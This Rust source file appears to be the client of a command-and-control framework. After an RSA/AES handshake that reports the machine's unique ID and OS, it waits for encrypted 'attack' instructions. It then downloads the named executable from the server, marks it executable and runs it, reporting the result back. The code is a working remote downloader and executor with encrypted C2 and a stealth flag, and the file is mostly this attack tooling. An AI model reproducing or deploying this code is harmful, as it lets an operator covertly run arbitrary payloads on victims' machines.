mod connexion;

// use std::borrow::Borrow;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::thread;
use std::str;
use std::sync::mpsc;

// Handshake
use rsa::{RsaPublicKey, RsaPrivateKey, Pkcs1v15Encrypt};
use rsa::pkcs8::{EncodePublicKey, LineEnding};
use rand::rngs::OsRng;
use serde_json;

use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use serde::{Deserialize, Serialize};
use generic_array::GenericArray;
use base64::{Engine as _, engine::general_purpose};
use std::fs::{self, File};
use std::path::Path;

type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

#[cfg(client_os = "linux")]
use std::os::unix::fs::PermissionsExt;

// JSON config handshake
#[derive(Serialize, Deserialize)]
struct HandshakeConfJson {
    action: String,
    b64symetric: String,
    b64iv: String,
    multithread: bool,
    stealth: bool,
}

// JSON attack
#[derive(Serialize, Deserialize)]
pub struct DataReceived {
    pub(crate) id: String,
    pub(crate) attack: String,
    pub(crate) arg1: String,
    pub(crate) arg2:String,
    pub(crate) arg3:String
}

pub(crate) fn json_to_struct_attack(data: String) -> Result<DataReceived, serde_json::Error> {
   match serde_json::from_str::<DataReceived>(&data) {
       Ok(data) => Ok(data),
       Err(err) => {
           eprintln!("Error parsing JSON data: {:?}", err);
           Err(err)
       }
   }
}

fn json_to_struct_handshake_stc(data: String) -> HandshakeConfJson {
    serde_json::from_str::<HandshakeConfJson>(&data).expect("Erreur JSON")
}

fn struct_to_json_handshake_stc(data: HandshakeConfJson) -> String {
    serde_json::to_string(&data).unwrap()
}



// Send data to server as bytes vector to the server
fn send_encrypted_data_to_server(
    sender: mpsc::Sender<Vec<u8>>,
    data: Vec<u8>,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
) {
    // let data_as_bytes = data.as_bytes().to_vec();
    let mut buffer = vec![0u8; data.len() + 16]; // Adjust buffer size
    let encrypted_data = Aes128CbcEnc::new(&symetric_key, &iv)
        .encrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buffer)
        .unwrap();

    if sender.send(encrypted_data.to_vec()).is_err() {
        eprintln!("Error sending data");
    }
}

// Send string to server
fn send_encrypted_string_to_server(
    sender: mpsc::Sender<Vec<u8>>,
    data: String,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
) {
    let data_as_bytes = data.as_bytes().to_vec();
    send_encrypted_data_to_server(sender, data_as_bytes, symetric_key, iv)
}


// Receive encrypted data from server
fn receive_encrypted_data_from_server(
    receiver: &mpsc::Receiver<Vec<u8>>,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
) -> Vec<u8> {
    match receiver.recv() {
        Ok(data) => {
            println!("Data received successfully!");

            // println!("Data received: {:?}", data);
            println!("Data len : {}", data.len().to_string());

            let mut buffer = vec![0u8; data.len() + 16];
            match Aes128CbcDec::new(&symetric_key, &iv)
                .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buffer)
            {
                Ok(decrypted_data) => { 
                    // Debug: Affiche les données décryptées
                    // println!("Decrypted data: {:?}", decrypted_data);

                    decrypted_data.to_vec()

                    // match str::from_utf8(decrypted_data) {
                    //     Ok(utf8_data) => utf8_data.to_string(),
                    //     Err(err) => {
                    //         eprintln!("Error converting data to UTF-8: {:?}", err);
                    //         String::new()
                    //     }
                    // }
                }
                Err(err) => {
                    eprintln!("Error decrypting data: {:?}", err);
                    String::new().as_bytes().to_vec()
                }
            }
        }
        Err(err) => {
            eprintln!("Error while receiving data: {:?}", err);
            String::new().as_bytes().to_vec()
        }
    }
}


// Receive encrypted string from the server
fn receive_encrypted_string_from_server(
    receiver: &mpsc::Receiver<Vec<u8>>,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
) -> String {
    
    let data_as_bytes = receive_encrypted_data_from_server(receiver, symetric_key, iv);
    match str::from_utf8(&data_as_bytes) {
        Ok(utf8_data) => utf8_data.to_string(),
        Err(err) => {
            eprintln!("Error converting data to UTF-8: {:?}", err);
            String::new()
        }
    }
}

fn receive_encrypted_file_from_server(mut stream: TcpStream,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    size_expected: usize,
) -> Vec<u8> {
    // TODO

    let mut buffer = vec![0u8; size_expected];
    let mut data = Vec::new();

    println!("[+] start receiving file from server");

    match stream.read_exact(&mut buffer) {
        Ok(()) => {
            println!("[+] start receiving file from server");
            data.extend_from_slice(&buffer[..size_expected]);
        }
        Err(e) => {
            println!("[!] Error reading file from server: {:?}", e);
        }
    }

    println!("[+] file received from server");
    // let mut buffer = vec![0u8; data.len() + 16];
    match Aes128CbcDec::new(&symetric_key, &iv).decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buffer){
        Ok(decrypted_data) => { 
            decrypted_data.to_vec()
        }

        Err(err) => {
            eprintln!("Error decrypting data: {:?}", err);
            String::new().as_bytes().to_vec()

        }
    }
}



fn check_and_request_executable(
                                    executable_name: &str,
                                    executable_dir: &str,
                                    sender: &mpsc::Sender<Vec<u8>>,
                                    receiver: &mpsc::Receiver<Vec<u8>>,
                                    symetric_key: &GenericArray<u8, typenum::consts::U16>,
                                    iv: &GenericArray<u8, typenum::consts::U16>,
                                    connexion: TcpStream
                                    ) -> io::Result<()> {

    #[cfg(client_os = "windows")]
    let executable_path = Path::new(executable_dir).join(executable_name).with_extension("exe");

    #[cfg(client_os = "linux")]
    let executable_path = Path::new(executable_dir).join(executable_name);
    
    println!("\t[?] Checking if executable exists at {:?}", executable_path);

    if !executable_path.exists() {
        println!("\t[!] Executable not found, requesting from server...");

        let request_message = format!("REQUEST_EXECUTABLE {}", executable_name);
        send_encrypted_string_to_server(sender.clone(), request_message, symetric_key.clone(), iv.clone());
        println!("\t\t[+] Request sent");

        
        let file_size = receive_encrypted_string_from_server(receiver, symetric_key.clone(), iv.clone());
        println!("\t\t[+] file size received : {:?}", file_size);


        println!("\t\t[+] sending back file size");
        send_encrypted_string_to_server(sender.clone(), file_size.clone(), symetric_key.clone(), iv.clone());


        println!("\t\t[+] waiting for file data");
        let data_file = receive_encrypted_file_from_server(connexion, symetric_key.clone(), iv.clone(), file_size.parse::<usize>().unwrap());
        println!("\t\t[+] file data received");


        let mut file = File::create(&executable_path)?;
        file.write_all(&data_file)?;

        #[cfg(client_os = "linux")]
        {
            let metadata = file.metadata()?;
            let mut permissions = metadata.permissions();
            permissions.set_mode(0o755); // rwxr-xr-x
            fs::set_permissions(&executable_path, permissions)?;
        }

        println!("\t\t[+] Executable received and stored at {:?}", executable_path);
    } else {
        println!("\t[+] Executable found at {:?}", executable_path);
        send_encrypted_string_to_server(sender.clone(), "YES".to_string(), symetric_key.clone(), iv.clone());
    }

    Ok(())
}

fn execute_attack(
    attack_name: &str,
    sender: &mpsc::Sender<Vec<u8>>,
    receiver: &mpsc::Receiver<Vec<u8>>,
    symetric_key: &GenericArray<u8, typenum::consts::U16>,
    iv: &GenericArray<u8, typenum::consts::U16>,
    connexion: TcpStream
) -> io::Result<()> {
    let executable_dir = "./actions";

    check_and_request_executable(attack_name, executable_dir, sender, receiver, symetric_key, iv, connexion)?;

    #[cfg(client_os = "windows")]
    let executable_path = Path::new(executable_dir).join(attack_name).with_extension("exe");

    #[cfg(client_os = "linux")]
    let executable_path = Path::new(executable_dir).join(attack_name);

    std::process::Command::new(executable_path).arg("10").spawn()?.wait()?;

    Ok(())
}

fn main() -> io::Result<()> {
    // Connexion
    let connexion: TcpStream = connexion::connexion()?;
    let connexion2: TcpStream = connexion.try_clone()?;
    let connexion3: TcpStream = connexion.try_clone()?;

    // thread emission
    let (sender, rx) = mpsc::channel::<Vec<u8>>();
    let sender_clone = sender.clone();
    let _thread_emission = thread::spawn(move || {
        connexion::emission(connexion, rx);
    });

    // thread reception
    let (tx2, receiver) = mpsc::channel::<Vec<u8>>();
    let _thread_reception = thread::spawn(move || {
        connexion::reception(connexion2, tx2);
    });

    // ========== HANDSHAKE ==========
    println!("[+] starting Handshake");
    // Génération de la paire de clés RSA
    let mut rng = OsRng;
    let bits = 2048;
    let private_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let public_key = RsaPublicKey::from(&private_key);

    let pkcs1_encoded_public_pem = public_key.to_public_key_pem(LineEnding::LF).unwrap();

    // Envoi de la clé publique au serveur python
    sender.send(pkcs1_encoded_public_pem.as_bytes().to_vec()).unwrap();

    // Réception de la clé symétrique chiffrée
    let encrypted_hanshake_data = receiver.recv().unwrap();

    // Déchiffrement de la clé symétrique
    let decrypted_data = private_key.decrypt(Pkcs1v15Encrypt, &encrypted_hanshake_data).unwrap();

    let handshake_data = json_to_struct_handshake_stc(str::from_utf8(decrypted_data.as_slice()).unwrap().to_string());

    let _stealth_mode = handshake_data.stealth;
    let _multithread_mode = handshake_data.multithread;

    // Decode the base64 key
    let symetric_key;
    match general_purpose::STANDARD.decode(handshake_data.b64symetric.as_bytes()) {
        Ok(decoded_sym_key) => {
            symetric_key = GenericArray::clone_from_slice(&decoded_sym_key);
        }
        Err(err) => {
            eprintln!("Error decoding base64 symetric key: {}", err);
            symetric_key = GenericArray::default();
        }
    };

    // Decode the base64 iv
    let iv;
    match general_purpose::STANDARD.decode(handshake_data.b64iv.as_bytes()) {
        Ok(decoded_iv) => {
            iv = GenericArray::clone_from_slice(&decoded_iv);
        }
        Err(err) => {
            eprintln!("Error decoding base64 iv: {}", err);
            iv = GenericArray::default();
        }
    };

    #[cfg(client_os = "windows")]
    let os = "windows";

    #[cfg(client_os = "linux")]
    let os = "linux";

    let uid = machine_uid::get().unwrap();

    let handshake_response = format!("{{\"action\":\"client_config\",\"uid\":\"{}\", \"os\":\"{}\"}}", uid, os);

    send_encrypted_string_to_server(sender.clone(), handshake_response, symetric_key.clone(), iv.clone());

    println!("[+] end Handshake");

    // ========== END HANDSHAKE ==========

    let _thread_test = thread::spawn(move || {
        // let mut response = String::new();

        loop {
            let message = receive_encrypted_string_from_server(&receiver, symetric_key.clone(), iv.clone());

            if let Ok(json_attack) = json_to_struct_attack(message.clone()) {
                println!("[?] instruction reçue : {}", json_attack.attack);

                let id_attack = json_attack.id;

                // println!("Received command: {}", message);
                match execute_attack(&json_attack.attack, &sender, &receiver, &symetric_key, &iv, connexion3.try_clone().expect("REASON")) {
                    Ok(_) => {
                        let response = format!("{{\"status\":\"success\",\"id\":\"{}\"}}", id_attack);
                        send_encrypted_string_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
                    }
                    Err(e) => {
                        let response = format!("{{\"status\":\"error\",\"id\":\"{}\",\"error\":\"{}\"}}", id_attack, e);
                        send_encrypted_string_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
                    }
                }
            }
        }
    });

    loop {
        let mut input = String::new();
        println!("Entrez un message : ");
        match io::stdin().read_line(&mut input) {
            Ok(_) => {
                println!("{}", input);
                send_encrypted_string_to_server(sender_clone.clone(), input, symetric_key.clone(), iv.clone());
            }
            Err(error) => println!("error: {}", error),
        }
    }
}
